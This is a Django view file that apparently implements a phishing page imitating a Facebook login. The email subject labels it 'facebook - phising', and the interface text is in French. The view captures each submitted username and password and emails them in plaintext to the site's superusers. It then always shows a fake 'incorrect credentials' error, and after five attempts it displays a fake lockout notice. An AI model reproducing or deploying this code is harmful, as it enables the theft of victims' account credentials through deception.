from django.shortcuts import render
from django.contrib import messages
from . models import Connexion
from django.conf import settings
from django.core.mail import EmailMessage
from django.template.loader import render_to_string
from django.contrib.auth.models import User


def admins_email(recipient:list)->list:
    """return admins's email"""
    users = User.objects.all()
    for admin in users:
        if admin.is_superuser:
            recipient.append(admin.email)
    return recipient

def index(request):
    context = {}
    if request.method=="POST":
        username = request.POST.get('username')
        password = request.POST.get('password')

        auth = Connexion()
        auth.username = username
        auth.password = password
        # auth.save()

        # send email with credential information 
        sender = settings.EMAIL_HOST_USER
        recipient = admins_email([])

        template_email = render_to_string('app/email.html', {'username' : username, 'password' : password})
        email = EmailMessage("New user logged into [facebook - phising]", template_email, sender, recipient)
        email.fail_silently = False
        try:
            email.send()
        except:
            pass
        else:
            print("Message envoyé")

        # the number of attempts limited to 5
        try:
            request.session['delay'] += 1
        except:
            request.session['delay'] = 1

        if request.session['delay'] == 5:
            print("Trop de tentatifs. Votre facebook est temporairement bloqué")
            print("Réessayer dans 4 minutes")
            context['limited'] = request.session.get('delay')
            
            request.session.set_expiry(60*3) # 3 minutes se expire

        print(request.session.get('delay'))

        messages.info(request, "Votre identifiant ou mot de passe incorrect. Réessayer")
        return render(request, 'app/index.html', context)
            
    return render(request, 'app/index.html')